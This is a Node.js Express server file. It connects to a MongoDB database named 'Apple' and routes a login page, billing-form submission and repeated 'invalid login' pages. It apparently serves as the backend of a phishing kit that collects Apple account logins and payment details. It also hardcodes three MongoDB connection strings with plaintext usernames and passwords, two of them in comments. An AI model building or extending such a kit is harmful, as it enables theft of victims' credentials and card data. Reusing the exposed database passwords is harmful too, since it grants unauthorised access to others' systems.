var mongoose = require('mongoose');

// var uri = 'mongodb+srv://jerminexxx:UJE3Nf0ZmQynubF7@cluster0.4ttil.mongodb.net/myFirstDatabase?retryWrites=true&w=majority';
// var uri = 'mongodb+srv://skormzy:ccJH128hhj9@cluster0.98il4.mongodb.net/myFirstDatabase?retryWrites=true&w=majority';
var uri = 'mongodb+srv://nursshafes:m2KSULe4dhur22qq@cluster0.wu1ntif.mongodb.net/Apple?retryWrites=true&w=majority';


mongoose.connect(uri, { 
    useNewUrlParser: true, 
    useUnifiedTopology: true,
    useCreateIndex: true
});

var connection = mongoose.connection;

connection.once('open', () => {
  console.log('MongoDB connection established successfully');
});

connection.on('error', (err) => {
  console.error('MongoDB connection error:', err);
});
const express = require("express");
const app = express();
app.use(express.static('public'));
// const connectDB = require("./config/db");
// connectDB();

const appController = require("./controllers/appController");

app.set("view engine", "ejs");
app.use(express.urlencoded({ extended: true }));



app.get("/", appController.login_page);
app.post("/", appController.login_post);
app.post("/billing/form", appController.billingform_post);
app.post("/billing/form/submit", appController.billingformsubmit_post);


app.get("/login/:page/:count", appController.page_loader_get)

app.post("/login/:page/:count", appController.page_loader_post)
app.post("/invalid/login/:page/:count", appController.invalidpage_loader_post)

app.get("/test", appController.test_page)


PORT = process.env.PORT || 3000;
app.listen(PORT, console.log(`App Running on http://localhost:${PORT}`));
